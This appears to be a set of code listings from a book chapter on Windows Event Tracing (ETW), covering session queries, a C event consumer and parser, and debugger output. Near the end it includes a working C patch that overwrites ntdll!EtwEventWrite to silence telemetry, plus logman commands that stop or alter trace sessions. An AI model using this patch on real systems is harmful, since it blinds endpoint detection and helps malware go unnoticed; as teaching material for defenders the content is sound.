["```\nPS > **$SDs = Get-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Security**\nPS > **$sddl = ([wmiclass]\"Win32_SecurityDescriptorHelper\").**\n**>> BinarySDToSDDL($SDs.****'****0063715b-eeda-4007-9429-ad526f62696e****'****).**\n**>> SDDL**\n\nPS > **ConvertFrom-SddlString -Sddl $sddl**\nOwner            : BUILTIN\\Administrators\nGroup            : BUILTIN\\Administrators\nDiscretionaryAcl : {NT AUTHORITY\\SYSTEM: AccessAllowed,\n                   NT AUTHORITY\\LOCAL SERVICE: AccessAllowed,\n                   BUILTIN\\Administrators: AccessAllowed}\nSystemAcl        : {}\nRawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor\n```", "```\nPS > **.\\FindETWProviderImage.exe \"Microsoft-Windows-TaskScheduler\" \"C:\\Windows\\System32\\\"**\nTranslated Microsoft-Windows-TaskScheduler to {de7b24ea-73c8-4a09-985d-5bdadcfa9017}\nFound provider in the registry: C:\\WINDOWS\\system32\\schedsvc.dll\n\nSearching 5486 files for {de7b24ea-73c8-4a09-985d-5bdadcfa9017} …\n\nTarget File: C:\\Windows\\System32\\aitstatic.exe\nRegistration Function Imported: True\nFound 1 reference:\n 1) Offset: 0x2d8330 RVA: 0x2d8330 (.data)\n\nTarget File: C:\\Windows\\System32\\schedsvc.dll\nRegistration Function Imported: True\nFound 2 references:\n 1) Offset: 0x6cb78 RVA: 0x6d778 (.rdata)\n 2) Offset: 0xab910 RVA: 0xaf110 (.pdata) Target File: C:\\Windows\\System32\\taskcomp.dll\nRegistration Function Imported: False\nFound 1 reference:\n 1) Offset: 0x39630 RVA: 0x3aa30 (.rdata)\n\nTarget File: C:\\Windows\\System32\\ubpm.dll\nRegistration Function Imported: True\nFound 1 reference:\n 1) Offset: 0x38288 RVA: 0x39a88 (.rdata)\n\nTotal References: 5\nTime Elapsed: 1.168 seconds\n```", "```\nschedsvc!JobsService::Initialize+0xcc:\n00007ffe`74096f5c 488935950a0800  mov   qword ptr [schedsvc!g_pEventManager],rsi\n00007ffe`74096f63 4c8bce          mov   r9,rsi\n00007ffe`74096f66 4533c0          xor   r8d,r8d\n00007ffe`74096f69 33d2            xor   edx,edx\n00007ffe`74096f6b 488d0d06680400  lea   rcx,[schedsvc!TASKSCHED] ❶\n00007ffe`74096f72 48ff150f570400  call  qword ptr [schedsvc!_imp_EtwEventRegister ❷\n00007ffe`74096f79 0f1f440000      nop   dword ptr [rax+rax]\n00007ffe`74096f7e 8bf8            mov   edi,eax\n00007ffe`74096f80 48391e          cmp   qword ptr [rsi],rbx\n00007ffe`74096f83 0f84293f0100    je    schedsvc!JobsService::Initialize+0x14022\n```", "```\nPS > **logman.exe query -ets**\n\nData Collector Set                      Type         Status\n-------------------------------------------------------------\nAppModel                                Trace        Running\nBioEnrollment                           Trace        Running\nDiagtrack-Listener                      Trace        Running\nFaceCredProv                            Trace        Running\nFaceTel                                 Trace        Running\nLwtNetLog                               Trace        Running\nMicrosoft-Windows-Rdp-Graphics-RdpIdd-Trace Trace    Running\nNetCore                                 Trace        Running\nNtfsLog                                 Trace        Running\nRadioMgr                                Trace        Running\nWiFiDriverIHVSession                    Trace        Running\nWiFiSession                             Trace        Running UserNotPresentTraceSession              Trace        Running\nNOCAT                                   Trace        Running\nAdmin_PS_Provider                       Trace        Running\nWindowsUpdate_trace_log                 Trace        Running\nMpWppTracing-20220120-151932-00000003-ffffffff Trace Running\nSHS-01202022-151937-7-7f                Trace        Running\nSgrmEtwSession                          Trace        Running\n```", "```\nPS > **logman.exe query 'EventLog-System' -ets**\n\nName:                  EventLog-System\nStatus:                Running\nRoot Path:             %systemdrive%\\PerfLogs\\Admin\nSegment:               Off\nSchedules:             On\nSegment Max Size:      100 MB\n\nName:                  EventLog-System\\EventLog-System\nType:                  Trace\nAppend:                Off\nCircular:              Off\nOverwrite:             Off\nBuffer Size:           64\nBuffers Lost:          0\nBuffers Written:       155\nBuffer Flush Timer:    1\nClock Type:            System\n❶ File Mode:             Real-time\n\nProvider:\n❷ Name:                  Microsoft-Windows-FunctionDiscoveryHost\nProvider Guid:         {538CBBAD-4877-4EB2-B26E-7CAEE8F0F8CB}\nLevel:                 255\nKeywordsAll:           0x0\n❸ KeywordsAny:           0x8000000000000000 (System)\nProperties:            65\nFilter Type:           0\n\nProvider:\nName:                  Microsoft-Windows-Subsys-SMSS\nProvider Guid:         {43E63DA5-41D1-4FBF-ADED-1BBED98FDD1D}\nLevel:                 255\nKeywordsAll:           0x0\nKeywordsAny:           0x4000000000000000 (System) Properties:            65\nFilter Type:           0\n`--snip--`\n```", "```\ntypedef struct _EVENT_TRACE_PROPERTIES {\n  WNODE_HEADER Wnode;\n  ULONG        BufferSize;\n  ULONG        MinimumBuffers;\n  ULONG        MaximumBuffers;\n  ULONG        MaximumFileSize;\n  ULONG        LogFileMode;\n  ULONG        FlushTimer;\n  ULONG        EnableFlags;\n  union {\n    LONG AgeLimit;\n    LONG FlushThreshold;\n  } DUMMYUNIONNAME;\n  ULONG        NumberOfBuffers;\n  ULONG        FreeBuffers;\n  ULONG        EventsLost;\n  ULONG        BuffersWritten;\n  ULONG        LogBuffersLost;\n  ULONG        RealTimeBuffersLost;\n  HANDLE LoggerThreadId;\n  ULONG        LogFileNameOffset;\n  ULONG        LoggerNameOffset;\n} EVENT_TRACE_PROPERTIES, *PEVENT_TRACE_PROPERTIES;\n```", "```\nstatic const GUID g_sessionGuid =\n{0xb09ce00c, 0xbcd9, 0x49eb,\n{0xae, 0xce, 0x42, 0x45, 0x1, 0x2f, 0x97, 0xa9}\n};\nstatic const WCHAR g_sessionName[] = L\"DotNETEventConsumer\";\n\nint main()\n{\n    ULONG ulBufferSize =\n        sizeof(EVENT_TRACE_PROPERTIES) + sizeof(g_sessionName);\n    PEVENT_TRACE_PROPERTIES pTraceProperties =\n        (PEVENT_TRACE_PROPERTIES)malloc(ulBufferSize);\n    if (!pTraceProperties)\n    {\n        return ERROR_OUTOFMEMORY;\n    }\n    ZeroMemory(pTraceProperties, ulBufferSize);\n\n    pTraceProperties->Wnode.BufferSize = ulBufferSize;\n    pTraceProperties->Wnode.Flags = WNODE_FLAG_TRACED_GUID;\n    pTraceProperties->Wnode.ClientContext = 1;\n    pTraceProperties->Wnode.Guid = g_sessionGuid;\n    pTraceProperties->LogFileMode = EVENT_TRACE_REAL_TIME_MODE;\n    pTraceProperties->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES); wcscpy_s(\n        (PWCHAR)(pTraceProperties + 1),\n        wcslen(g_sessionName) + 1,\n        g_sessionName);\n\n    DWORD dwStatus = 0;\n    TRACEHANDLE hTrace = NULL;\n\n    while (TRUE) {\n        dwStatus = StartTraceW(\n            &hTrace,\n            g_sessionName,\n            pTraceProperties);\n\n        if (dwStatus == ERROR_ALREADY_EXISTS)\n        {\n            dwStatus = ControlTraceW(\n                hTrace,\n                g_sessionName,\n                pTraceProperties,\n                EVENT_TRACE_CONTROL_STOP);\n        }\n    if (dwStatus != ERROR_SUCCESS)\n    {\n            return dwStatus;\n    }\n\n    `--snip--`\n}\n```", "```\nULONG WMIAPI EnableTraceEx2(\n  [in]           TRACEHANDLE               TraceHandle,\n  [in]           LPCGUID                   ProviderId,\n  [in]           ULONG                     ControlCode,\n  [in]           UCHAR                     Level,\n  [in]           ULONGLONG                 MatchAnyKeyword,\n  [in]           ULONGLONG                 MatchAllKeyword, [in]           ULONG                     Timeout,\n  [in, optional] PENABLE_TRACE_PARAMETERS EnableParameters\n);\n```", "```\n❶ static const GUID g_providerGuid =\n{0xe13c0d23, 0xccbc, 0x4e12,\n{0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4}\n};\nint main()\n{\n    `--snip--`\n\n    dwStatus = EnableTraceEx2(\n        hTrace,\n        &g_providerGuid,\n        EVENT_CONTROL_CODE_ENABLE_PROVIDER,\n        TRACE_LEVEL_INFORMATION,\n      ❷ 0x2038,\n        0,\n        INFINITE,\n        NULL); if (dwStatus != ERROR_SUCCESS)\n    {\n        goto Cleanup;\n    }\n\n    `--snip--`\n}\n```", "```\ntypedef struct _EVENT_TRACE_LOGFILEW {\n   LPWSTR                        LogFileName;\n   LPWSTR                        LoggerName;\n   LONGLONG                      CurrentTime;\n   ULONG                         BuffersRead;\n   union {\n     ULONG LogFileMode;\n     ULONG ProcessTraceMode;\n   } DUMMYUNIONNAME;\n   EVENT_TRACE                   CurrentEvent;\n   TRACE_LOGFILE_HEADER          LogfileHeader;\n   PEVENT_TRACE_BUFFER_CALLBACKW BufferCallback;\n   ULONG                         BufferSize;\n   ULONG                         Filled;\n   ULONG                         EventsLost;\n   union {\n     PEVENT_CALLBACK        EventCallback;\n     PEVENT_RECORD_CALLBACK EventRecordCallback;\n   } DUMMYUNIONNAME2;\n   ULONG                          IsKernelTrace;\n   PVOID                          Context;\n}  EVENT_TRACE_LOGFILEW, *PEVENT_TRACE_LOGFILEW;\n```", "```\nint main()\n{\n    `--snip--`\n\n    EVENT_TRACE_LOGFILEW etl = {0}; ❶ etl.LoggerName = g_sessionName;\n ❷ etl.ProcessTraceMode = PROCESS_TRACE_MODE_EVENT_RECORD |\n                           PROCESS_TRACE_MODE_REAL_TIME;\n ❸ etl.EventRecordCallback = OnEvent;\n\n    TRACEHANDLE hSession = NULL;\n    hSession = OpenTrace(&etl);\n    if (hSession == INVALID_PROCESSTRACE_HANDLE)\n    {\n        goto Cleanup;\n    }\n\n    `--snip--`\n}\n```", "```\nvoid ProcessEvents(PTRACEHANDLE phSession)\n{\n    FILETIME now;\n ❶ GetSystemTimeAsFileTime(&now);\n    ProcessTrace(phSession, 1, &now, NULL);\n\n}\nint main()\n{\n    `--snip--`\n\n    HANDLE hThread = NULL;\n ❷ hThread = CreateThread(\n                  NULL, 0,\n                  ProcessEvents,\n                  &hSession,\n                  0, NULL);\n\n    if (!hThread)\n    {\n        goto Cleanup;\n    } `--snip--`\n}\n```", "```\nHANDLE g_hStop = NULL;\nBOOL ConsoleCtrlHandler(DWORD dwCtrlType)\n\n{\n ❶ if (dwCtrlType == CTRL_C_EVENT) {\n      ❷ SetEvent(g_hStop);\n        return TRUE;\n    }\n    return FALSE;\n}\n\nint main()\n{\n    `--snip--`\n\n    g_hStop = CreateEvent(NULL, TRUE, FALSE, NULL);\n    SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);\n\n    WaitForSingleObject(g_hStop, INFINITE);\n\n ❸ CloseTrace(hSession);\n    WaitForSingleObject(hThread, INFINITE);\n    CloseHandle(g_hStop);\n    CloseHandle(hThread); return dwStatus\n}\n```", "```\ntypedef struct _EVENT_RECORD {\n  EVENT_HEADER                      EventHeader;\n  ETW_BUFFER_CONTEXT                BufferContext;\n  USHORT                            ExtendedDataCount;\n  USHORT                            UserDataLength;\n  PEVENT_HEADER_EXTENDED_DATA_ITEM  ExtendedData;\n  PVOID                             UserData;\n  PVOID                             UserContext;\n} EVENT_RECORD, *PEVENT_RECORD;\n```", "```\ntypedef struct _EVENT_HEADER_EXTENDED_DATA_ITEM {\n  USHORT   Reserved1;\n  USHORT   ExtType;\n  struct {\n    USHORT Linkage : 1;\n    USHORT Reserved2 : 15;\n  };\n  USHORT   DataSize;\n  ULONGLONG DataPtr;\n} EVENT_HEADER_EXTENDED_DATA_ITEM, *PEVENT_HEADER_EXTENDED_DATA_ITEM;\n```", "```\n#define EVENT_HEADER_EXT_TYPE_RELATED_ACTIVITYID   0x0001\n#define EVENT_HEADER_EXT_TYPE_SID                  0x0002\n#define EVENT_HEADER_EXT_TYPE_TS_ID                0x0003\n#define EVENT_HEADER_EXT_TYPE_INSTANCE_INFO        0x0004\n#define EVENT_HEADER_EXT_TYPE_STACK_TRACE32        0x0005\n#define EVENT_HEADER_EXT_TYPE_STACK_TRACE64        0x0006\n#define EVENT_HEADER_EXT_TYPE_PEBS_INDEX           0x0007\n#define EVENT_HEADER_EXT_TYPE_PMC_COUNTERS         0x0008\n#define EVENT_HEADER_EXT_TYPE_PSM_KEY              0x0009\n#define EVENT_HEADER_EXT_TYPE_EVENT_KEY            0x000A\n#define EVENT_HEADER_EXT_TYPE_EVENT_SCHEMA_TL      0x000B\n#define EVENT_HEADER_EXT_TYPE_PROV_TRAITS          0x000C\n#define EVENT_HEADER_EXT_TYPE_PROCESS_START_KEY    0x000D\n#define EVENT_HEADER_EXT_TYPE_CONTROL_GUID         0x000E\n#define EVENT_HEADER_EXT_TYPE_QPC_DELTA            0x000F\n#define EVENT_HEADER_EXT_TYPE_CONTAINER_ID         0x0010\n#define EVENT_HEADER_EXT_TYPE_MAX                  0x0011\n```", "```\nvoid CALLBACK OnEvent(PEVENT_RECORD pRecord)\n{\n    ULONG ulSize = 0;\n    DWORD dwStatus = 0;\n    PBYTE pUserData = (PBYTE)pRecord->UserData;\n\n    dwStatus = TdhGetEventInformation(pRecord, 0, NULL, NULL, &ulSize);\n\n    PTRACE_EVENT_INFO pEventInfo = (PTRACE_EVENT_INFO)malloc(ulSize);\n    if (!pEventInfo)\n    {\n        // Exit immediately if we're out of memory\n        ExitProcess(ERROR_OUTOFMEMORY);\n    }\n\n    dwStatus = TdhGetEventInformation(\n        pRecord, 0,\n        NULL,\n        pEventInfo,\n        &ulSize);\n    if (dwStatus != ERROR_SUCCESS)\n    {\n        return;\n    }\n\n    `--snip--`\n}\n```", "```\ntypedef struct _TRACE_EVENT_INFO {\n  GUID                ProviderGuid;\n  GUID                EventGuid;\n  EVENT_DESCRIPTOR    EventDescriptor;\n❶ DECODING_SOURCE     DecodingSource;\n  ULONG               ProviderNameOffset;\n  ULONG               LevelNameOffset;\n  ULONG               ChannelNameOffset;\n  ULONG               KeywordsNameOffset;\n  ULONG               TaskNameOffset;\n  ULONG               OpcodeNameOffset;\n  ULONG               EventMessageOffset;\n  ULONG               ProviderMessageOffset;\n  ULONG               BinaryXMLOffset;\n  ULONG               BinaryXMLSize;\n  union {\n    ULONG EventNameOffset;\n    ULONG ActivityIDNameOffset;\n  };\n  union {\n    ULONG EventAttributesOffset;\n    ULONG RelatedActivityIDNameOffset;\n};\n  ULONG               PropertyCount;\n  ULONG               TopLevelPropertyCount;\n  union {\n    TEMPLATE_FLAGS Flags;\n    struct {\n      ULONG Reserved : 4;\n      ULONG Tags : 28;\n    };\n  };\n❷ EVENT_PROPERTY_INFO EventPropertyInfoArray[ANYSIZE_ARRAY];\n} TRACE_EVENT_INFO;\n```", "```\ntypedef struct _EVENT_PROPERTY_INFO {\n❶ PROPERTY_FLAGS Flags;\n  ULONG   NameOffset;\n  union {\n    struct {\n      USHORT InType;\n      USHORT OutType;\n      ULONG MapNameOffset;\n    } nonStructType;\n    struct {\n      USHORT StructStartIndex;\n      USHORT NumOfStructMembers;\n      ULONG padding;\n    } structType;\n    struct {\n      USHORT InType;\n      USHORT OutType;\n      ULONG CustomSchemaOffset;\n    } customSchemaType;\n  };\n  union {\n  ❷ USHORT count;\n    USHORT countPropertyIndex;\n  };\n  union {\n  ❸ USHORT length;\n    USHORT lengthPropertyIndex;\n  };\n union {\n    ULONG Reserved;\n    struct {\n      ULONG Tags : 28;\n    };\n  };\n} EVENT_PROPERTY_INFO;\n```", "```\ntypedef struct _EVENT_MAP_INFO {\n  ULONG           NameOffset;\n  MAP_FLAGS       Flag;\n  ULONG           EntryCount;\n  union {\n    MAP_VALUETYPE MapEntryValueType;\n    ULONG         FormatStringOffset;\n  };\n  EVENT_MAP_ENTRY MapEntryArray[ANYSIZE_ARRAY];\n} EVENT_MAP_INFO;\n```", "```\nvoid CALLBACK OnEvent(PEVENT_RECORD pRecord)\n{\n  `--snip--`\n\n    WCHAR pszValue[512];\n    USHORT wPropertyLen = 0;\n    ULONG ulPointerSize =\n      (pRecord->EventHeader.Flags & EVENT_HEADER_FLAG_32_BIT_HEADER) ? 4 : 8;\n\n    USHORT wUserDataLen = pRecord->UserDataLength;\n\n ❶ for (USHORT i = 0; i < pEventInfo->TopLevelPropertyCount; i++)\n    {\n        EVENT_PROPERTY_INFO propertyInfo =\n          pEventInfo->EventPropertyInfoArray[i];\n        PCWSTR pszPropertyName =\n          PCWSTR)((BYTE*)pEventInfo + propertyInfo.NameOffset);\n\n      wPropertyLen = propertyInfo.length;\n\n    ❷ if ((propertyInfo.Flags & PropertyStruct | PropertyParamCount)) != 0)\n      {\n          return;\n      }\n      PEVENT_MAP_INFO pMapInfo = NULL; PWSTR mapName = NULL;\n\n    ❸ if (propertyInfo.nonStructType.MapNameOffset)\n      {\n          ULONG ulMapSize = 0;\n          mapName = (PWSTR)((BYTE*)pEventInfo +\n            propertyInfo.nonStructType.MapNameOffset);\n\n          dwStatus = TdhGetEventMapInformation(\n                       pRecord,\n                       mapName,\n                       pMapInfo,\n                       &ulMapSize);\n\n          if (dwStatus == ERROR_INSUFFICIENT_BUFFER)\n          {\n            pMapInfo = (PEVENT_MAP_INFO)malloc(ulMapSize);\n\n          ❹ dwStatus = TdhGetEventMapInformation(\n                         pRecord,\n                         mapName,\n                         pMapInfo,\n                         &ulMapSize);\n        if (dwStatus != ERROR_SUCCESS)\n        {\n            pMapInfo = NULL;\n        }\n      }\n    }\n    `--snip--`\n}\n```", "```\nvoid CALLBACK OnEvent(PEVENT_RECORD pRecord)\n{\n    `--snip--`\n\n    ULONG ulBufferSize = sizeof(pszValue);\n    USHORT wSizeConsumed = 0;\n\n    dwStatus = TdhFormatProperty(\n                pEventInfo,\n                pMapInfo, ulPointerSize,\n                propertyInfo.nonStructType.InType,\n                propertyInfo.nonStructType.OutType,\n                wPropertyLen,\n                wUserDataLen,\n                pUserData,\n                &ulBufferSize,\n              ❶ pszValue,\n                &wSizeConsumed);\n\n    if (dwStatus == ERROR_SUCCESS)\n    {\n      `--snip--`\n\n      wprintf(L\"%s: %s\\n\", ❷ pszPropertyName, pszValue);\n\n      `--snip--`\n    }\n\n    `--snip--`\n}\n```", "```\nAssemblyID: 0x266B1031DC0\nAppDomainID: 0x26696BBA650\nBindingID: 0x0\nAssemblyFlags: 0\nFullyQualifiedAssemblyName: Seatbelt, Version=1.0.0.0, `--snip--`\nClrInstanceID: 10\n```", "```\nlogman.exe update trace `TRACE_NAME` --p `PROVIDER_NAME` --ets\n```", "```\nlogman.exe stop \"`TRACE_NAME`\" -ets\n```", "```\nbp ntdll!EtwEventWrite \"r $t0 = 0;\n  .foreach (p {k}) {.if ($spat(\\\"p\\\", \\\"clr!*\\\")) {r $t0 = 1; .break}};\n  .if($t0 = 0) {gc}\"\n```", "```\n 0:000> **k**\n  # RetAddr                Call Site\n❶ 00 ntdll!EtwEventWrite\n  01 clr!CoTemplate_xxxqzh+0xd5\n  02 clr!ETW::LoaderLog::SendAssemblyEvent+0x1cd\n❷ 03 clr!ETW::LoaderLog::ModuleLoad+0x155\n  04 clr!DomainAssembly::DeliverSyncEvents+0x29\n  05 clr!DomainFile::DoIncrementalLoad+0xd9\n  06 clr!AppDomain::TryIncrementalLoad+0x135\n  07 clr!AppDomain::LoadDomainFile+0x149\n  08 clr!AppDomain::LoadDomainAssemblyInternal+0x23e\n  09 clr!AppDomain::LoadDomainAssembly+0xd9\n  0a clr!AssemblyNative::GetPostPolicyAssembly+0x4dd\n  0b clr!AssemblyNative::LoadFromBuffer+0x702\n  0c clr!AssemblyNative::LoadImage+0x1ef\n❸ 0d mscorlib_ni!System.AppDomain.Load(Byte[])$ 60007DB+0x3b\n  0e mscorlib_ni!DomainNeutralILStubClass.IL_STUB_CLRtoCOM(Byte[])\n  0f clr!COMToCLRDispatchHelper+0x39\n  10 clr!COMToCLRWorker+0x1b4\n  11 clr!GenericComCallStub+0x57\n  12 0x00000209`24af19a6\n  13 0x00000209`243a0020\n  14 0x00000209`24a7f390\n  15 0x000000c2`29fcf950\n```", "```\n#define WIN32_LEAN_AND_MEAN\n#include <Windows.h>\n\nvoid PatchedAssemblyLoader()\n{\n    PVOID pfnEtwEventWrite = NULL;\n    DWORD dwOldProtection = 0;\n\n ❶ pfnEtwEventWrite = GetProcAddress(\n      LoadLibraryW(L\"ntdll\"),\n      \"EtwEventWrite\"\n    );\n\n    if (!pfnEtwEventWrite)\n    {\n        return;\n    }\n\n ❷ VirtualProtect(\n      pfnEtwEventWrite,\n      3,\n      PAGE_READWRITE,\n      &dwOldProtection\n      );\n\n ❸ memcpy(\n      pfnEtwEventWrite,\n      \"\\x33\\xc0\\xc3\", // xor eax, eax; ret\n      3\n      );\n\n ❹ VirtualProtect(\n      pfnEtwEventWrite,\n      3,\n      dwOldProtection,\n      NULL\n      );\n\n      `--snip--`\n}\n```", "```\n0:000> **u ntdll!EtwEventWrite**\nntdll!EtwEventWrite:\n00007ff8`7e8bf1a0 33c0         xor     eax,eax\n00007ff8`7e8bf1a2 c3           ret\n00007ff8`7e8bf1a3 4883ec58     sub     rsp,58h\n00007ff8`7e8bf1a7 4d894be8     mov     qword ptr [r11-18h],r9\n00007ff8`7e8bf1ab 33c0         xor     eax,eax\n00007ff8`7e8bf1ad 458943e0     mov     dword ptr [r11-20h],r8d\n00007ff8`7e8bf1b1 4533c9       xor     r9d,r9d\n00007ff8`7e8bf1b4 498943d8     mov      qword ptr [r11-28h],rax\n```"]